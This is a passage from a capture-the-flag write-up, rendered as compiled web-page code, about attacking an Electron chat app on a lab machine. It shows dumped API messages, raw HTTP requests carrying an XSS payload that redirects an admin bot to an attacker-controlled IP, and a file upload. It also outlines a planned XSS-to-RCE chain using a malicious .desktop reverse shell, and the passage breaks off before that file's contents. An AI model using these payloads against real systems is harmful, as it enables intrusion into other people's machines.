punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"application/json; charset=utf-8\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Content-Length\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"1812\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Date\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"Sat, 03 Dec 2022 09:20:29 GMT\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Connection\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"close\"})]}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[{\"id\":1,\"sender\":\"admin\",\"receiver\":\"developer\",\"message\":\"Hey!\",\"timestamp\":\"2022-12-03 08:42:27\",\"lastMessage\":\"false\",\"type\":\"message\"},{\"id\":2,\"sender\":\"developer\",\"receiver\":\"admin\",\"message\":\"Hey!!\",\"timestamp\":\"2022-12-03 08:42:27\",\"lastMessage\":\"false\",\"type\":\"message\"},{\"id\":3,\"sender\":\"developer\",\"receiver\":\"admin\",\"message\":\"You are using the admin account on the server itself right?\",\"timestamp\":\"2022-12-03 08:42:27\",\"lastMessage\":\"false\",\"type\":\"message\"},{\"id\":4,\"sender\":\"admin\",\"receiver\":\"developer\",\"message\":\"Yes\",\"timestamp\":\"2022-12-03 08:42:27\",\"lastMessage\":\"false\",\"type\":\"message\"},{\"id\":5,\"sender\":\"developer\",\"receiver\":\"admin\",\"message\":\"Well thats good make sure to use the admin account on the server.\",\"timestamp\":\"2022-12-03 08:42:27\",\"lastMessage\":\"false\",\"type\":\"message\"},{\"id\":6,\"sender\":\"admin\",\"receiver\":\"developer\",\"message\":\"Yes I know you did explained me why I should use it only on server.\",\"timestamp\":\"2022-12-03 08:42:27\",\"lastMessage\":\"false\",\"type\":\"message\"},{\"id\":7,\"sender\":\"developer\",\"receiver\":\"admin\",\"message\":\"Nice.\",\"timestamp\":\"2022-12-03 08:42:27\",\"lastMessage\":\"false\",\"type\":\"message\"},{\"id\":8,\"sender\":\"admin\",\"receiver\":\"developer\",\"message\":\"The service checkup script that you created is not working anymore with the selenium grid after the update. We create a temporary workaround for that but can you please come and fix the script?\",\"timestamp\":\"2022-12-03 08:42:27\",\"lastMessage\":\"false\",\"type\":\"message\"},{\"id\":9,\"sender\":\"developer\",\"receiver\":\"admin\",\"message\":\"Yeah Sure\",\"timestamp\":\"2022-12-03 08:42:27\",\"lastMessage\":\"true\",\"type\":\"message\"},{\"id\":10,\"sender\":\"tbug\",\"receiver\":\"developer\",\"message\":\"Why userland city market place is not working for me?\",\"timestamp\":\"2022-12-03 08:42:27\",\"lastMessage\":\"true\",\"type\":\"message\"}]\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"The only interesting message was this:\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsx)(n.code,{className:\"code-highlight\",children:(0,e.jsx)(n.span,{className:\"code-line\",children:`The service checkup script that you created is not working anymore with the Selenium grid after the update. We create a temporary workaround for that but can you please come and fix the script?\n`})})}),`\n`,(0,e.jsx)(n.p,{children:\"For the time being, this may be irrelevant until we check the other endpoints.\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-js\",children:(0,e.jsxs)(n.code,{className:\"language-js code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token function\",children:\"fetch\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"concat\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"_config_json__WEBPACK_IMPORTED_MODULE_1__\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token constant\",children:\"BACKEND_URL\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"/api/chats/\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"concat\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"currentChat\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"/add\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"                \",(0,e.jsx)(n.span,{className:\"token literal-property property\",children:\"method\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'POST'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"                \",(0,e.jsx)(n.span,{className:\"token literal-property property\",children:\"headers\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"                  \",(0,e.jsx)(n.span,{className:\"token string-property property\",children:\"'Accept'\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'application/json'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"                  \",(0,e.jsx)(n.span,{className:\"token string-property property\",children:\"'Content-Type'\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'application/json'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"                  \",(0,e.jsx)(n.span,{className:\"token string-property property\",children:\"'token'\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token dom variable\",children:\"localStorage\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"getItem\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'token'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"                \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.pre,{className:\"language-js\",children:(0,e.jsxs)(n.code,{className:\"language-js code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"var\"}),\" \",(0,e.jsx)(n.span,{className:\"token function-variable function\",children:\"uploadFile\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token parameter\",children:\"e\"}),\" \",(0,e.jsx)(n.span,{className:\"token arrow operator\",children:\"=\u003e\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"            \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"var\"}),\" formData \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"new\"}),\" \",(0,e.jsx)(n.span,{className:\"token class-name\",children:\"FormData\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"            formData\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"append\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'uploadedFile'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" e\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token property-access\",children:\"target\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token property-access\",children:\"files\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"            \",(0,e.jsx)(n.span,{className:\"token function\",children:\"fetch\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"concat\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"_config_json__WEBPACK_IMPORTED_MODULE_1__\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token constant\",children:\"BACKEND_URL\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"/api/\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"concat\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"currentChat\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"/upload\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"              \",(0,e.jsx)(n.span,{className:\"token literal-property property\",children:\"method\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'POST'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"              \",(0,e.jsx)(n.span,{className:\"token literal-property property\",children:\"headers\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"                \",(0,e.jsx)(n.span,{className:\"token string-property property\",children:\"'token'\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token dom variable\",children:\"localStorage\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"getItem\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'token'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"              \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"              \",(0,e.jsx)(n.span,{className:\"token literal-property property\",children:\"body\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),` formData\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"            \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"And now we have a way to interact with users by sending them files and messages!\"}),`\n`,(0,e.jsx)(n.p,{children:\"Now, let\\u2019s get back to the message that we got earlier, where the users were talking about a Selenium script. Selenium allows you to write test scripts or bots that interact with a web application in a similar way to how a user would interact with the application. We can assume now that we will have to trick the bot into downloading our files or interacting with our messages!\"}),`\n`,(0,e.jsxs)(n.p,{children:[\"Here\\u2019s an example on how we can use both \",(0,e.jsx)(n.code,{children:\"/add\"}),\" and \",(0,e.jsx)(n.code,{children:\"/upload\"}),\" API to download/add files/messages:\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-http\",children:(0,e.jsxs)(n.code,{className:\"language-http code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token request-line\",children:[(0,e.jsx)(n.span,{className:\"token method property\",children:\"POST\"}),\" \",(0,e.jsx)(n.span,{className:\"token request-target url\",children:(0,e.jsxs)(n.span,{className:\"token path\",children:[(0,e.jsx)(n.span,{className:\"token path-separator\",children:\"/\"}),\"api\",(0,e.jsx)(n.span,{className:\"token path-separator\",children:\"/\"}),\"chats\",(0,e.jsx)(n.span,{className:\"token path-separator\",children:\"/\"}),\"admin\",(0,e.jsx)(n.span,{className:\"token path-separator\",children:\"/\"}),\"add\"]})}),\" \",(0,e.jsx)(n.span,{className:\"token http-version property\",children:\"HTTP/1.1\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Host\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"10.129.255.120:9000\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Cache-Control\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"max-age=0\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"token\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),(0,e.jsx)(n.span,{className:\"token header-value\",children:\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImRldmVsb3BlciIsImlhdCI6MTY3MDA2MjEwMywiZXhwIjoxNjcwMDgzNzAzfQ.G1M-pWAsNnKSFxSoljbBd_lwZVGurgn9_IApQppnGgs\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Upgrade-Insecure-Requests\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"1\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"User-Agent\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Accept\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Accept-Encoding\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"gzip, deflate\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Accept-Language\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"en-US,en;q=0.9\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Connection\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"close\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Content-Type\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"application/json\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Content-Length\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"62\"})]}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsx)(n.span,{className:\"token application-json\",children:`\n`})}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsxs)(n.span,{className:\"token application-json\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),(0,e.jsx)(n.span,{className:\"token property\",children:'\"message\"'}),(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"\u003cscript\u003edocument.location=\"'}),\"http\",(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),(0,e.jsx)(n.span,{className:\"token comment\",children:'//10.10.10.10/jaja\"\u003c\\/script\u003e\"}'}),`\n`]})})]})}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`POST /api/admin/upload HTTP/1.1\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Host: \",(0,e.jsx)(n.span,{className:\"token number\",children:\"10.129\"}),`.255.120:9000\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"User-Agent: Mozilla/5.0 \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"X11\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\" Linux x86_64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" AppleWebKit/537.36 \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"KHTML, like Gecko\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),` Chrome/107.0.0.0 Safari/537.36\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Accept-Encoding: gzip, deflate\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Accept: text/html,application/xhtml+xml,application/xml\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:\"q\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0.9\"}),\",image/avif,image/webp,image/apng,*/*\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:\"q\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0.8\"}),\",application/signed-exchange\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:\"v\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\"b3\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:\"q\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0.9\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Connection: close\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Cache-Control: max-age\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImRldmVsb3BlciIsImlhdCI6MTY3MDA2MjEwMywiZXhwIjoxNjcwMDgzNzAzfQ.G1M-pWAsNnKSFxSoljbBd_lwZVGurgn9_IApQppnGgs\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Upgrade-Insecure-Requests: \",(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Accept-Language: en-US,en\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:\"q\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0.9\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Content-Length: \",(0,e.jsx)(n.span,{className:\"token number\",children:\"247\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Content-Type: multipart/form-data\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\" \",(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:\"boundary\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),`02427ffc75ddf91f43eb19151c610654\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`--02427ffc75ddf91f43eb19151c610654\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Content-Disposition: form-data\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\" \",(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:\"name\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"uploadedFile\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\" \",(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:\"filename\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"testfile\"'}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`pwned\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`--02427ffc75ddf91f43eb19151c610654--\n`})]})}),`\n`,(0,e.jsxs)(n.h3,{id:\"bonus-part---running-gui-app\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#bonus-part---running-gui-app\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"BONUS PART - Running GUI app\"]}),`\n`,(0,e.jsxs)(n.blockquote,{children:[`\n`,(0,e.jsx)(n.p,{children:\"This part is not needed to continue exploitation or understand the exploit path.\"}),`\n`]}),`\n`,(0,e.jsxs)(n.p,{children:[\"So, if we try to open the GUI application. It will keep hanging and that\\u2019s because it wasn\\u2019t able to reach the API as the \",(0,e.jsx)(n.code,{children:\"config.json\"}),\" file which includes the \",(0,e.jsx)(n.code,{children:\"BACKEND_URL\"}),\" variable is missing. Here we have two options:\"]}),`\n`,(0,e.jsxs)(n.ol,{children:[`\n`,(0,e.jsxs)(n.li,{children:[\"Create the \",(0,e.jsx)(n.code,{children:\"config.json\"}),\" file with the proper \",(0,e.jsx)(n.code,{children:\"BACKEND_URL\"}),\", which is the instance ip\"]}),`\n`,(0,e.jsxs)(n.li,{children:[\"The lazy way (Which I used XD) is to change all the \",(0,e.jsx)(n.code,{children:\"_config_json__WEBPACK_IMPORTED_MODULE_1__.BACKEND_URL\"}),\" to the ip instance.\"]}),`\n`]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/vscode-replace.png\",alt:\"A screenshot of replacing strings with vscode\"})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Another thing to change is the CSP in the \",(0,e.jsx)(n.code,{children:\"index.html\"}),\". We can either change \",(0,e.jsx)(n.code,{children:\"127.0.0.1\"}),\" to the machine ip or (as you probably already guessed as I am lazy) just remove the whole CSP:\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/html-csp.png\",alt:\"A screenshot that shows the Content Security Policy of the Web page\"})}),`\n`,(0,e.jsx)(n.p,{children:\"Then we can run the app:\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsx)(n.code,{className:\"code-highlight\",children:(0,e.jsx)(n.span,{className:\"code-line\",children:`hcue@pjsk:~/htb/medimelecro/resources \\xBB electron extract\n`})})}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/app-gui.png\",alt:\"A screenshot of the Electron App GUI\"})}),`\n`,(0,e.jsx)(n.p,{children:\"We can also see also the previous conversation that we extracted from the web API:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/admin-chat-gui.png\",alt:\"A screenshot of the Admin chat with the developer\"})}),`\n`,(0,e.jsxs)(n.h3,{id:\"exploitation-1\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#exploitation-1\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Exploitation\"]}),`\n`,(0,e.jsx)(n.p,{children:\"To wrap everything we found until now:\"}),`\n`,(0,e.jsxs)(n.ul,{children:[`\n`,(0,e.jsx)(n.li,{children:\"Usage of shell.openExternal(url) which can lead to XSS -\u003e RCE\"}),`\n`,(0,e.jsx)(n.li,{children:\"We can send messages to the admin user\"}),`\n`,(0,e.jsx)(n.li,{children:\"We can upload messages to the admin user\"}),`\n`,(0,e.jsx)(n.li,{children:\"Messages mentioning the usage of Selenium scripts\"}),`\n`]}),`\n`,(0,e.jsx)(n.p,{children:\"The only exploitation path we can see is we assume that there is a bot that\\u2019s either downloading the files or clicking the urls (or maybe both?).\"}),`\n`,(0,e.jsxs)(n.p,{children:[\"To achieve RCE, we will trick the bot into opening our malicious \",(0,e.jsx)(n.code,{children:\".desktop\"}),\" file which will contain our reverse shell:\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-ini\",children:(0,e.jsxs)(n.code,{className:\"language-ini code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token section\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token section-name selector\",children:\"Desktop Entry\"}),(0,e.jsx)(n.span,{className:\"token 